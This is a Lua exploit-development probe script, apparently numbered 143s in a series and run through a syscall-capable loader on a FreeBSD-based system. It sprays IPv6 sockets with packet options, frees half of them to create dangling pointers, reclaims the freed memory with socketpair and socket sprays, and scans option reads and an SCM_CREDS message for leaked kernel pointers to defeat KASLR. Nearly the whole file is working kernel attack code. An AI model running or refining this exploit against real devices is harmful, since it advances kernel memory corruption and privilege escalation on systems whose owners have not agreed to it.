-- CRASH_CLASS: MODERATE
-- PROBE 143s: IPv6 pktopts overlap v2 — fixed pipe/socketpair handling
--
-- Context: 143q showed syscall.pipe() returns fd in register (23/25), not via buffer.
-- FreeBSD raw pipe(42) returns fd0=rax, fd1=rdx; loader wrapper likely wraps this.
-- Fix: use socketpair(AF_LOCAL) which writes to buffer, or parse pipe return value.
-- Also: use the correct pktopts overlap technique for KASLR defeat.

print("=== PROBE 143s: PKTOPTS OVERLAP v2 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hex_val(v)
    if v == nil then return "nil" end
    if type(v) == "table" and v.tonumber then
        local h, l = get_hi_lo(v)
        return string.format("0x%X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end

local pid = to_num(syscall.getpid())
print("[*] pid=" .. pid)

--------------------------------------------------------------------
-- [A] Test socketpair — this writes fds to buffer correctly
--------------------------------------------------------------------
print("")
print("--- [A] Socketpair ---")

local sp_fds = memory.alloc(16)
memory.write_dword(sp_fds, 0xDEAD)
memory.write_dword(sp_fds + 4, 0xDEAD)

local rv_sp = syscall.socketpair(uint64(1), uint64(1), uint64(0), uint64(sp_fds))
local sp_ret = to_num(rv_sp)
print("[A] socketpair(AF_LOCAL, SOCK_STREAM) ret=" .. sp_ret)

local sp0 = to_num(memory.read_dword(sp_fds))
local sp1 = to_num(memory.read_dword(sp_fds + 4))
print("[A] fds: " .. sp0 .. ", " .. sp1)

if sp_ret == 0 and sp0 > 0 then
    -- Test bidirectional I/O
    local wbuf = memory.alloc(64)
    local rbuf = memory.alloc(64)
    memory.write_qword(wbuf, uint64("0xDEADBEEFCAFEBABE"))

    local ok_w, rv_w = pcall(function()
        return syscall.write(uint64(sp0), uint64(wbuf), uint64(8))
    end)
    print("[A] write(sp0, 8) ret=" .. tostring(rv_w))

    local ok_r, rv_r = pcall(function()
        return syscall.read(uint64(sp1), uint64(rbuf), uint64(8))
    end)
    print("[A] read(sp1) ret=" .. tostring(rv_r))
    if ok_r and to_num(rv_r) > 0 then
        print("[A] data=" .. hex_val(memory.read_qword(rbuf)))
    end

    syscall.close(uint64(sp0))
    syscall.close(uint64(sp1))
    print("[A] socketpair WORKS")
else
    print("[A] socketpair FAILED")
end

--------------------------------------------------------------------
-- [B] Test pipe via socketpair as alternative
-- Also test raw pipe return value as fd
--------------------------------------------------------------------
print("")
print("--- [B] Pipe via return value ---")

local pipe_rd = -1
local pipe_wr = -1

-- Method 1: syscall.pipe() may return read fd directly, write fd in second retval
local ok_p, rv_p1, rv_p2 = pcall(function()
    return syscall.pipe()
end)
if ok_p then
    print("[B] pipe() rv1=" .. tostring(rv_p1) .. " rv2=" .. tostring(rv_p2))
    local fd1 = to_num(rv_p1)
    if fd1 > 0 then
        -- The loader's pipe wrapper might return (read_fd, write_fd)
        local fd2 = rv_p2 and to_num(rv_p2) or -1
        print("[B] pipe fds: " .. fd1 .. ", " .. fd2)
        if fd2 > 0 then
            pipe_rd = fd1
            pipe_wr = fd2
        end
    end
end

-- Method 2: pipe2(542) with buffer
if pipe_rd < 0 then
    print("[B] Trying pipe2(542)...")
    local pipefds = memory.alloc(16)
    memory.write_dword(pipefds, 0)
    memory.write_dword(pipefds + 4, 0)
    local pipe2_fn = fcall(syscall.syscall_address, 542)
    local ok_p2, rv_p2_ret = pcall(function()
        return pipe2_fn(uint64(pipefds), uint64(0))
    end)
    if ok_p2 then
        local ret_val = to_num(rv_p2_ret)
        print("[B] pipe2 ret=" .. ret_val)
        local fd_r = to_num(memory.read_dword(pipefds))
        local fd_w = to_num(memory.read_dword(pipefds + 4))
        print("[B] pipe2 fds: " .. fd_r .. ", " .. fd_w)
        if ret_val == 0 and fd_r > 0 then
            pipe_rd = fd_r
            pipe_wr = fd_w
        end
    else
        print("[B] pipe2 FAIL: " .. tostring(rv_p2_ret))
    end
end

-- Method 3: Just use socketpair as pipe
if pipe_rd < 0 then
    print("[B] Using socketpair as pipe substitute")
    local pfds = memory.alloc(16)
    local rv = syscall.socketpair(uint64(1), uint64(1), uint64(0), uint64(pfds))
    if to_num(rv) == 0 then
        pipe_rd = to_num(memory.read_dword(pfds))
        pipe_wr = to_num(memory.read_dword(pfds + 4))
        print("[B] socketpair-pipe fds: " .. pipe_rd .. ", " .. pipe_wr)
    end
end

if pipe_rd > 0 then
    -- Verify I/O works
    local wb = memory.alloc(64)
    local rb = memory.alloc(64)
    memory.write_qword(wb, uint64("0x4141414142424242"))
    syscall.write(uint64(pipe_wr), uint64(wb), uint64(8))
    local ok_r2, rv_r2 = pcall(function()
        return syscall.read(uint64(pipe_rd), uint64(rb), uint64(8))
    end)
    print("[B] pipe I/O: read ret=" .. tostring(rv_r2) .. " data=" .. hex_val(memory.read_qword(rb)))
end

--------------------------------------------------------------------
-- [C] IPv6 pktopts spray — allocate many pktopts structures
--------------------------------------------------------------------
print("")
print("--- [C] IPv6 pktopts spray ---")

local NUM_SOCKETS = 100
local sockets = {}
local optval = memory.alloc(16)

for i = 1, NUM_SOCKETS do
    local ok, fd = pcall(function()
        return syscall.socket(uint64(28), uint64(2), uint64(0))
    end)
    if ok then
        local fd_num = to_num(fd)
        if fd_num >= 0 then
            -- Set IPV6_2292PKTINFO(19) to allocate pktopts
            memory.write_dword(optval, 1)
            local ok_s, rv_s = pcall(function()
                return syscall.setsockopt(uint64(fd_num), uint64(41), uint64(19), uint64(optval), uint64(4))
            end)
            if ok_s and to_num(rv_s) == 0 then
                -- Also set IPV6_2292HOPLIMIT(20) and IPV6_2292RTHDR(24) to fill more fields
                memory.write_dword(optval, 1)
                pcall(function() syscall.setsockopt(uint64(fd_num), uint64(41), uint64(20), uint64(optval), uint64(4)) end)
                memory.write_dword(optval, 1)
                pcall(function() syscall.setsockopt(uint64(fd_num), uint64(41), uint64(24), uint64(optval), uint64(4)) end)
                table.insert(sockets, fd_num)
            else
                syscall.close(uint64(fd_num))
            end
        end
    end
end

print("[C] Created " .. #sockets .. " IPv6 sockets with pktopts")

if #sockets < 20 then
    print("[C] Not enough sockets for reliable spray")
end

--------------------------------------------------------------------
-- [D] Read pktopts BEFORE free — establish baseline
--------------------------------------------------------------------
print("")
print("--- [D] Baseline pktopts read ---")

local optbuf = memory.alloc(0x400)
local optlenp = memory.alloc(8)

-- Read option 25 (IPV6_2292PKTOPTIONS) — dumps raw pktopts
-- Also read each individual option that was set

for idx = 1, math.min(3, #sockets) do
    local fd = sockets[idx]

    -- Try option 25 first (raw pktopts dump)
    for off = 0, 0x3FC, 4 do memory.write_dword(optbuf + off, 0xBBBBBBBB) end
    memory.write_qword(optlenp, uint64(0x400))

    local ok25, rv25 = pcall(function()
        return syscall.getsockopt(uint64(fd), uint64(41), uint64(25), uint64(optbuf), uint64(optlenp))
    end)

    if ok25 then
        local ret25 = to_num(rv25)
        local len25 = to_num(memory.read_qword(optlenp))
        print("[D] fd=" .. fd .. " opt25 ret=" .. ret25 .. " len=" .. len25)

        if ret25 == 0 and len25 > 0 then
            -- Dump first 64 bytes
            for off = 0, math.min(len25 - 4, 60), 4 do
                local dw = memory.read_dword(optbuf + off)
                local val = to_num(dw)
                if val ~= 0xBBBBBBBB then
                    print("[D]   +" .. string.format("%02X", off) .. "=" .. string.format("0x%08X", val))
                end
            end

            -- Scan for kernel pointers
            for off = 0, math.min(len25 - 8, 0x3F8), 8 do
                local q = memory.read_qword(optbuf + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        print("[D] !!! KPTR fd=" .. fd .. " opt25 +" .. string.format("%X", off) .. "=" .. hex_val(q))
                    end
                end
            end
        end
    end

    -- Try individual options for sizes
    for _, optnum in ipairs({19, 20, 24}) do
        memory.write_qword(optlenp, uint64(0x100))
        local ok_g, rv_g = pcall(function()
            return syscall.getsockopt(uint64(fd), uint64(41), uint64(optnum), uint64(optbuf), uint64(optlenp))
        end)
        if ok_g and to_num(rv_g) == 0 then
            local gotlen = to_num(memory.read_qword(optlenp))
            if idx == 1 then
                print("[D] fd=" .. fd .. " opt" .. optnum .. " len=" .. gotlen)
            end
        end
    end
end

--------------------------------------------------------------------
-- [E] Free every other socket's pktopts by DISABLING the option
-- This frees the in6p_outputopts without closing the socket
-- The socket keeps a dangling pointer to freed memory
--------------------------------------------------------------------
print("")
print("--- [E] Free pktopts (disable options) ---")

local victim_sockets = {}
local safe_sockets = {}

for i = 1, #sockets do
    if i % 2 == 0 then
        local fd = sockets[i]
        -- Disable IPV6_2292PKTINFO by setting to 0
        memory.write_dword(optval, 0)
        local ok_d, rv_d = pcall(function()
            return syscall.setsockopt(uint64(fd), uint64(41), uint64(19), uint64(optval), uint64(4))
        end)
        -- Also disable 20 and 24
        pcall(function() syscall.setsockopt(uint64(fd), uint64(41), uint64(20), uint64(optval), uint64(4)) end)
        pcall(function() syscall.setsockopt(uint64(fd), uint64(41), uint64(24), uint64(optval), uint64(4)) end)

        table.insert(victim_sockets, fd)
    else
        table.insert(safe_sockets, sockets[i])
    end
end

print("[E] Disabled pktopts on " .. #victim_sockets .. " sockets")
print("[E] Kept active on " .. #safe_sockets .. " sockets")

--------------------------------------------------------------------
-- [F] ALTERNATIVE: Close half and re-read surviving sockets
-- If option disable doesn't free pktopts, try close()
--------------------------------------------------------------------
print("")
print("--- [F] Close victim sockets ---")

for _, fd in ipairs(victim_sockets) do
    pcall(function() syscall.close(uint64(fd)) end)
end
print("[F] Closed " .. #victim_sockets .. " victim sockets (freed pktopts)")

--------------------------------------------------------------------
-- [G] Spray socketpairs to reclaim freed pktopts memory
-- Each socketpair creates kernel socket objects that may reclaim slots
--------------------------------------------------------------------
print("")
print("--- [G] Socketpair spray ---")

local spray_pairs = {}
local spray_data = memory.alloc(0x100)

-- Write a pattern into spray data
for off = 0, 0xFC, 8 do
    memory.write_qword(spray_data + off, uint64(string.format("0x%08X%08X", 0x43434343 + off, 0x44444444 + off)))
end

for i = 1, 50 do
    local pfds = memory.alloc(16)
    local ok, rv = pcall(function()
        return syscall.socketpair(uint64(1), uint64(1), uint64(0), uint64(pfds))
    end)
    if ok and to_num(rv) == 0 then
        local fd_a = to_num(memory.read_dword(pfds))
        local fd_b = to_num(memory.read_dword(pfds + 4))
        table.insert(spray_pairs, {a=fd_a, b=fd_b})

        -- Write marker data through each pair
        pcall(function()
            syscall.write(uint64(fd_a), uint64(spray_data), uint64(0x80))
        end)
    end
end

print("[G] Created " .. #spray_pairs .. " socketpairs for spray")

--------------------------------------------------------------------
-- [H] Also spray with new IPv6 sockets (same allocator)
--------------------------------------------------------------------
print("")
print("--- [H] IPv6 reclaim spray ---")

local reclaim_socks = {}

for i = 1, 50 do
    local ok, fd = pcall(function()
        return syscall.socket(uint64(28), uint64(2), uint64(0))
    end)
    if ok then
        local fd_num = to_num(fd)
        if fd_num >= 0 then
            memory.write_dword(optval, 1)
            local ok_s = pcall(function()
                return syscall.setsockopt(uint64(fd_num), uint64(41), uint64(19), uint64(optval), uint64(4))
            end)
            if ok_s then
                table.insert(reclaim_socks, fd_num)
            else
                syscall.close(uint64(fd_num))
            end
        end
    end
end

print("[H] Created " .. #reclaim_socks .. " reclaim IPv6 sockets")

--------------------------------------------------------------------
-- [I] Read surviving sockets' pktopts — look for contaminated data
--------------------------------------------------------------------
print("")
print("--- [I] Post-spray pktopts read ---")

local kptr_total = 0

for idx, fd in ipairs(safe_sockets) do
    -- Read option 25 (raw pktopts dump)
    for off = 0, 0x3FC, 4 do memory.write_dword(optbuf + off, 0xCCCCCCCC) end
    memory.write_qword(optlenp, uint64(0x400))

    local ok25, rv25 = pcall(function()
        return syscall.getsockopt(uint64(fd), uint64(41), uint64(25), uint64(optbuf), uint64(optlenp))
    end)

    if ok25 and to_num(rv25) == 0 then
        local len25 = to_num(memory.read_qword(optlenp))

        -- Scan for kernel pointers
        for off = 0, math.min(len25 - 8, 0x3F8), 8 do
            local q = memory.read_qword(optbuf + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    kptr_total = kptr_total + 1
                    if kptr_total <= 20 then
                        print("[I] !!! KPTR fd=" .. fd .. " opt25 +" .. string.format("%X", off) .. "=" .. hex_val(q))
                    end
                end
                -- Also check for spray markers
                if h == 0x43434343 or (l >= 0x44444444 and l <= 0x44444544) then
                    print("[I] SPRAY MARKER fd=" .. fd .. " +" .. string.format("%X", off) .. "=" .. hex_val(q))
                end
            end
        end

        -- Check if any data changed from baseline (non-sentinel values)
        local changed = 0
        for off = 0, math.min(len25 - 4, 0x3FC), 4 do
            local dw = to_num(memory.read_dword(optbuf + off))
            if dw ~= 0xCCCCCCCC and dw ~= 0 and dw ~= 1 then
                changed = changed + 1
            end
        end

        if idx <= 5 then
            print("[I] fd=" .. fd .. " opt25 len=" .. len25 .. " non-zero-dwords=" .. changed)
        end
    elseif idx <= 5 then
        print("[I] fd=" .. fd .. " opt25 ret=" .. tostring(rv25))
    end

    -- Also check individual options for leaked data
    for _, optnum in ipairs({19, 20, 24}) do
        for off = 0, 0xFF, 4 do memory.write_dword(optbuf + off, 0xCCCCCCCC) end
        memory.write_qword(optlenp, uint64(0x100))

        local ok_g, rv_g = pcall(function()
            return syscall.getsockopt(uint64(fd), uint64(41), uint64(optnum), uint64(optbuf), uint64(optlenp))
        end)

        if ok_g and to_num(rv_g) == 0 then
            local gotlen = to_num(memory.read_qword(optlenp))
            for off = 0, math.min(gotlen - 8, 0xF8), 8 do
                local q = memory.read_qword(optbuf + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        kptr_total = kptr_total + 1
                        if kptr_total <= 20 then
                            print("[I] !!! KPTR fd=" .. fd .. " opt" .. optnum .. " +" .. string.format("%X", off) .. "=" .. hex_val(q))
                        end
                    end
                end
            end
        end
    end
end

print("[I] Total kernel pointers: " .. kptr_total)

--------------------------------------------------------------------
-- [J] Also read reclaim sockets' pktopts
--------------------------------------------------------------------
print("")
print("--- [J] Reclaim socket pktopts ---")

local kptr_reclaim = 0

for idx, fd in ipairs(reclaim_socks) do
    for off = 0, 0x3FC, 4 do memory.write_dword(optbuf + off, 0xDDDDDDDD) end
    memory.write_qword(optlenp, uint64(0x400))

    local ok25, rv25 = pcall(function()
        return syscall.getsockopt(uint64(fd), uint64(41), uint64(25), uint64(optbuf), uint64(optlenp))
    end)

    if ok25 and to_num(rv25) == 0 then
        local len25 = to_num(memory.read_qword(optlenp))
        for off = 0, math.min(len25 - 8, 0x3F8), 8 do
            local q = memory.read_qword(optbuf + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    kptr_reclaim = kptr_reclaim + 1
                    if kptr_reclaim <= 10 then
                        print("[J] !!! KPTR fd=" .. fd .. " +" .. string.format("%X", off) .. "=" .. hex_val(q))
                    end
                end
            end
        end
    end
end

print("[J] Reclaim kernel pointers: " .. kptr_reclaim)

--------------------------------------------------------------------
-- [K] Try sendmsg/recvmsg with SCM_CREDS to leak kernel cred struct
--------------------------------------------------------------------
print("")
print("--- [K] SCM_CREDS leak ---")

-- Create a fresh socketpair for SCM_CREDS test
local scm_fds = memory.alloc(16)
local rv_scm = syscall.socketpair(uint64(1), uint64(1), uint64(0), uint64(scm_fds))
if to_num(rv_scm) == 0 then
    local scm0 = to_num(memory.read_dword(scm_fds))
    local scm1 = to_num(memory.read_dword(scm_fds + 4))

    -- Enable LOCAL_CREDS on receiving socket
    -- SOL_LOCAL (0) option LOCAL_CREDS (2)
    memory.write_dword(optval, 1)
    local ok_lc, rv_lc = pcall(function()
        return syscall.setsockopt(uint64(scm1), uint64(0), uint64(2), uint64(optval), uint64(4))
    end)
    print("[K] setsockopt(LOCAL_CREDS) ret=" .. tostring(rv_lc))

    -- Send a message through the pair
    local msghdr = memory.alloc(0x80)
    local iov = memory.alloc(0x20)
    local data = memory.alloc(0x20)
    memory.write_dword(data, 0x41424344)

    -- iovec
    memory.write_qword(iov, uint64(data))
    memory.write_qword(iov + 8, uint64(4))

    -- msghdr for send
    memory.write_qword(msghdr, uint64(0))
    memory.write_dword(msghdr + 8, 0)
    memory.write_qword(msghdr + 16, uint64(iov))
    memory.write_dword(msghdr + 24, 1)
    memory.write_qword(msghdr + 32, uint64(0))
    memory.write_dword(msghdr + 40, 0)

    -- sendmsg
    local sendmsg_fn = fcall(syscall.syscall_address, 28)
    local ok_sm, rv_sm = pcall(function()
        return sendmsg_fn(uint64(scm0), uint64(msghdr), uint64(0))
    end)
    print("[K] sendmsg ret=" .. tostring(rv_sm))

    -- Receive with large cmsg buffer for creds
    local recv_cmsg = memory.alloc(0x200)
    local recv_data = memory.alloc(0x100)
    local recv_iov = memory.alloc(0x20)
    local recv_hdr = memory.alloc(0x80)

    -- Fill with sentinel
    for off = 0, 0x1FC, 4 do memory.write_dword(recv_cmsg + off, 0xEEEEEEEE) end

    memory.write_qword(recv_iov, uint64(recv_data))
    memory.write_qword(recv_iov + 8, uint64(0x100))

    memory.write_qword(recv_hdr, uint64(0))
    memory.write_dword(recv_hdr + 8, 0)
    memory.write_qword(recv_hdr + 16, uint64(recv_iov))
    memory.write_dword(recv_hdr + 24, 1)
    memory.write_qword(recv_hdr + 32, uint64(recv_cmsg))
    memory.write_dword(recv_hdr + 40, 0x200)

    local recvmsg_fn = fcall(syscall.syscall_address, 27)
    local ok_rm, rv_rm = pcall(function()
        return recvmsg_fn(uint64(scm1), uint64(recv_hdr), uint64(0))
    end)
    print("[K] recvmsg ret=" .. tostring(rv_rm))

    if ok_rm and to_num(rv_rm) >= 0 then
        local clen = to_num(memory.read_dword(recv_hdr + 40))
        print("[K] controllen=" .. clen)

        -- Parse cmsg header
        if clen > 0 then
            local cmsg_len = to_num(memory.read_dword(recv_cmsg))
            local cmsg_level = to_num(memory.read_dword(recv_cmsg + 4))
            local cmsg_type = to_num(memory.read_dword(recv_cmsg + 8))
            print("[K] cmsg: len=" .. cmsg_len .. " level=" .. cmsg_level .. " type=" .. cmsg_type)

            -- Dump cmsg data
            for off = 12, math.min(cmsg_len, 0x80), 4 do
                local dw = to_num(memory.read_dword(recv_cmsg + off))
                if dw ~= 0xEEEEEEEE and dw ~= 0 then
                    print("[K]   +" .. string.format("%02X", off) .. "=" .. string.format("0x%08X", dw))
                end
            end

            -- Scan for kernel pointers
            for off = 0, math.min(clen - 8, 0x1F8), 8 do
                local q = memory.read_qword(recv_cmsg + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        print("[K] !!! KPTR in cmsg +" .. string.format("%X", off) .. "=" .. hex_val(q))
                    end
                end
            end
        end
    end

    syscall.close(uint64(scm0))
    syscall.close(uint64(scm1))
end

--------------------------------------------------------------------
-- Cleanup
--------------------------------------------------------------------
print("")
print("--- Cleanup ---")
for _, fd in ipairs(safe_sockets) do pcall(function() syscall.close(uint64(fd)) end) end
for _, fd in ipairs(reclaim_socks) do pcall(function() syscall.close(uint64(fd)) end) end
for _, p in ipairs(spray_pairs) do
    pcall(function() syscall.close(uint64(p.a)) end)
    pcall(function() syscall.close(uint64(p.b)) end)
end
if pipe_rd > 0 then
    pcall(function() syscall.close(uint64(pipe_rd)) end)
    pcall(function() syscall.close(uint64(pipe_wr)) end)
end

print("")
print("=== PROBE 143s COMPLETE ===")
